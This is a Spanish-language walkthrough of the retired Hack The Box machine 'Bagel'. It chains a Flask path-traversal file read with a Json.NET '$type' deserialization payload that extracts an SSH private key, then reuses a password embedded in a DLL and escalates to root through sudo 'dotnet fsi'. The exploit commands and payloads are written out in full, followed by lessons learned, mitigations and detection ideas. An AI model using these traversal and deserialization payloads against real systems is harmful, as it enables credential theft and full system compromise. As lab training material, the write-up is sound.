---
machine: Bagel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, flask, file-read, dotnet, websocket, json-deserialization, reversing, dotnet-fsi, privesc]
---

# Bagel — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El puerto `8000` sirve una aplicación Flask con lectura de archivos en `?page=`. Con ella se lee `/proc/self/cmdline`, se localiza `/home/developer/app/app.py` y se entiende que la web habla por WebSocket con un servicio .NET en `5000`. El mismo fallo descarga `/opt/bagel/bin/Debug/net6.0/bagel.dll`; al reversearlo aparece `TypeNameHandling.Auto` en Json.NET, explotable con un objeto `$type` que instancia `bagel_server.File` y lee archivos arbitrarios. El payload devuelve la clave SSH de `phil`. La DLL también contiene la contraseña de `developer`, y esa cuenta puede ejecutar `dotnet` como root: `dotnet fsi` lanza comandos con privilegios de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,5000,8000 <IP>
```

- `22`: OpenSSH.
- `5000`: servidor .NET por WebSocket.
- `8000`: Flask.

```bash
echo '<IP> bagel.htb' | sudo tee -a /etc/hosts
```

## Enumeración

El parámetro `page` concatena la ruta sin validarla:

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../etc/passwd'
curl -o- 'http://bagel.htb:8000/?page=../../../../proc/self/cmdline'
```

La línea de comandos revela la ubicación de la aplicación:

```text
python3 /home/developer/app/app.py
```

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../home/developer/app/app.py'
```

El código muestra la ruta `/orders`: abre un WebSocket contra `ws://127.0.0.1:5000/` y envía `{"ReadOrder":"orders.txt"}`. El proceso .NET se localiza por su `cmdline`:

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../proc/<PID>/cmdline'
```

```text
dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

## Foothold

La DLL se descarga con la misma lectura de archivos:

```bash
curl -o bagel.dll 'http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll'
```

Con dnSpy se ve que el mensaje recibido se deserializa con Json.NET y `TypeNameHandling.Auto`. Esa configuración acepta un `$type` controlado por el cliente. La clase `bagel_server.File` expone `ReadFile`, y el setter se ejecuta durante la deserialización:

```json
{"RemoveOrder":{"$type":"bagel_server.File, bagel","ReadFile":"../../../../etc/passwd"}}
```

Se conecta al WebSocket y se envía el objeto:

```bash
wscat -c ws://bagel.htb:5000
```

```text
> {"RemoveOrder":{"$type":"bagel_server.File, bagel","ReadFile":"../../../../home/phil/.ssh/id_rsa"}}
```

La respuesta incluye la clave privada de `phil`, con la que se entra por SSH y se lee `user.txt`.

## Movimiento lateral

La DLL contiene la cadena de conexión de una base de datos con credenciales de `developer`. Esa contraseña funciona en el sistema:

```bash
su - developer
```

## Escalada de privilegios

`developer` puede ejecutar `dotnet` como root sin contraseña:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/dotnet
```

`dotnet fsi` abre F# interactivo y permite lanzar procesos como root:

```bash
sudo dotnet fsi
```

```fsharp
System.Diagnostics.Process.Start("id").WaitForExit();;
```

También se puede crear un proyecto y ejecutarlo:

```bash
dotnet new console -o /tmp/exploit
cd /tmp/exploit
sudo dotnet run
```

Ambas vías dan una shell o ejecución como root y acceso a `/root/root.txt`.

## Evidencia

- Lectura de `/etc/passwd`, `app.py` y `bagel.dll` con `?page=`.
- WebSocket en `5000` y deserialización con `TypeNameHandling.Auto`.
- Payload `bagel_server.File` devolviendo la clave SSH de `phil`.
- Credenciales de `developer` extraídas de la DLL y `su` correcto.
- `sudo dotnet fsi` ejecutando `id` como root.

## Lecciones aprendidas

- Concatenar rutas en un parámetro de lectura permite traversal.
- Los procesos y su `cmdline` revelan rutas internas y artefactos.
- `TypeNameHandling.Auto` en Json.NET convierte datos en tipos controlados por el atacante.
- Las cadenas de conexión y credenciales acaban en binarios y se reutilizan.
- Conceder `dotnet` por `sudo` equivale a dar una shell completa.

## Mitigaciones y detección

- Resolver rutas contra un directorio base y rechazar `..`.
- No deserializar tipos dinámicos; usar `TypeNameHandling.None` y validar el esquema.
- No incrustar credenciales en binarios y rotarlas si se distribuyen.
- Evitar reglas `sudo` sobre intérpretes y herramientas que ejecutan código.
- Monitorizar `dotnet fsi`, `dotnet run` y procesos hijos de `sudo`.
- Alertar de payloads JSON con `$type` en WebSockets internos.

## Referencias

- [0xdf — Bagel](https://0xdf.gitlab.io/2023/06/03/htb-bagel.html)
- [Hack The Box — Bagel](https://app.hackthebox.com/machines/bagel)
- [Knowledge — Deserialización .NET](../../../knowledge/windows/dotnet-deserialization.md)
- [Knowledge — dnSpy](../../../knowledge/reversing/dotnet-dnspy.md)
